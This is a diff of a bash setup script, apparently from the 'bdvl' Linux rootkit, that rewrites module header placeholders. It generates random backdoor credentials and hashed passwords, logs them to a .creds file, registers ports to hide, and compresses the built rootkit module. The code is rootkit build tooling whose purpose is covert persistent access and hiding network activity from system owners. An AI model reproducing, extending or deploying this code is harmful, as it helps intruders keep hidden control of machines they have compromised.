@@ -2,7 +2,9 @@ find_var_placeholders(){
     local headers current_var \
           header_path header_vars \
           vars
+
     headers=(`find_header_paths`)
+
     for w in ${headers[@]}; do
         header_path=$w
         header_vars=("`cat $header_path | grep '??'`")
@@ -18,31 +20,36 @@ find_var_placeholders(){
 }
 
 get_setting(){ # $1 = var
-    local var var_name input is_string \
-          range_hide_ports
+    local var name \
+          input is_string
     var="$1"
 
-    [[ $var == *"\""* ]] && is_string=1
-    [[ $var != *"\""* ]] && is_string=0
+    # standard lengths for variable values.
+    # values are randomly generated unless a value
+    # is otherwise specified at runtime.
+    local default_strlen=8
+    local default_intlen=4
 
-    [ $is_string == 1 ] && input="`random 'a-z' 8`" # random text
-    [ $is_string == 0 ] && input=`random '1-9' 4` # random integer
+    [[ $var == *"\""* ]] && is_string=1 || is_string=0
+    #[[ $var != *"\""* ]] && is_string=0
 
-    eval "var_name=\"`printf ${var} | tr -d '\"\?,'`\""
-    [ ! -z "`printf "${!var_name}"`" ] && input="${!var_name}"
-    echo "$var_name = $input" >> $BDVLSO.creds
+    [ $is_string == 1 ] && input="`random 'a-z' $default_strlen`"
+    [ $is_string == 0 ] && input=`random '1-9' $default_intlen`
 
-    [[ "$var_name" == *"_PORT" ]] && \
-        [ `echo -n "$var_name" | awk -F"_" '{printf NF-1}'` == 2 ] && \
-            range_hide_ports+=($input)
-    [[ "$var_name" == *"_PORT" ]] && \
-        [ `echo -n "$var_name" | awk -F"_" '{printf NF-1}'` == 1 ] && \
-            HIDE_PORTS+=($input)
+    eval "name=\"`printf ${var} | tr -d '\"\?,'`\""
+    # this check here determines whether or not there is already
+    # a value available for $input to use. (set at runtime or
+    # predefined in one of the scripts)
+    [ ! -z "`printf "${!name}"`" ] && input="${!name}"
+    echo "$name = $input" >> $BDVLSO.creds
 
-    [ `toggle_enabled USE_CRYPT` == "true" ] && [[ "$var_name" == *"_PWD" ]] && input="`crypt_password $input`"
+    [ `toggle_enabled USE_CRYPT` == "true" ] && [[ "$name" == *"_PWD" ]] && \
+        input="`crypt_password $input`" # if the variable is intended to be a password,
+                                        # make sure it's hashed before writing it anywhere
 
-    [ $is_string == 1 ] && echo -n "\"`xor $input`\":$var"
-    [ $is_string == 0 ] && echo -n "$input:$var"
+    [ $is_string == 1 ] && input="\"$input\""
+
+    echo -n "$input:$var"
 }
 
 output_creds(){
@@ -67,22 +74,47 @@ setup_header(){ # $1 = header to write to
 
     necho "Writing background variables"
     write_consts >> $1
-    echo "#endif" >> $1
 }
 
 populate_new_placeholders(){
     cp -r $MDIR/ $NEW_MDIR/ || { eecho "Couldn't copy module directory"; exit; }
 
     setup_header $BDVL_H
-    [ `toggle_enabled HIDE_PORTS` == "true" ] && get_hide_ports
 
-    local var_placeholders settings
+    local var_placeholders settings index
+
     necho "Getting variable placeholders and their new values"
     var_placeholders=(`find_var_placeholders`)
-    for var in ${var_placeholders[@]}; do settings+=(`get_setting "$var"`); done
+    for i in ${!var_placeholders[@]}; do
+        local current_var="${var_placeholders[$i]}"
+        settings+=(`get_setting "$current_var"`)
+
+        # if the current setting is that of a port to hide,
+        # add it to our array of hidden ports so that we can
+        # write it to the 'hide_ports' file.
+        [ `toggle_enabled HIDE_PORTS` == "false" ] && continue  # don't if we don't need to
+        IFS=':' read -r curvar_val curvar_name <<< "${settings[$i]}"
+        [[ "$curvar_name" == *"PORT"* ]] && \
+            add_hiddenport $curvar_name $curvar_val
+    done
 
     output_creds
 
     necho "Overwriting old variable placeholders with new settings"
     for selem in ${settings[@]}; do overwrite_placeholder "$selem"; done
+
+    if [ $DOCOMPRESS == 1 ]; then
+        [ ! -f `bin_path tar` ] && { eecho "Couldn't locate 'tar' on this machine."; exit; }
+        echo; secho "Beginning compression of $NEW_MDIR"
+        verbose "Writing environment settings to $NEW_MDIR/settings"
+        write_defaults $NEW_MDIR/settings
+
+        local tarname="$NEW_MDIR.tar.gz"
+        #echo; necho "Now compressing $NEW_MDIR, with gzip"
+        verbose "tarball name = $tarname"
+        sleep 1
+        tar cpfz $tarname $NEW_MDIR && \
+            secho "Finished compressing successfully" || \
+            eecho "Failure trying to compress with tar (gzip)"
+    fi
 }
